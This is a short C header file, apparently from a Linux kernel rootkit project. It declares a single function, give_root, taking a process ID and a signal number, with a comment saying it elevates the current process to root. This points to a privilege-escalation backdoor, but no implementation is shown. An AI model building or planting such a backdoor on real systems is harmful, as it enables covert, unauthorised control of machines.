#ifndef _ROOTKIT_UTILS_H_
#define _ROOTKIT_UTILS_H_

#include <linux/types.h>


/**
 * Elevate the current process to root
 */
void give_root(const pid_t i32_pid, const int i32_sig);

#endif
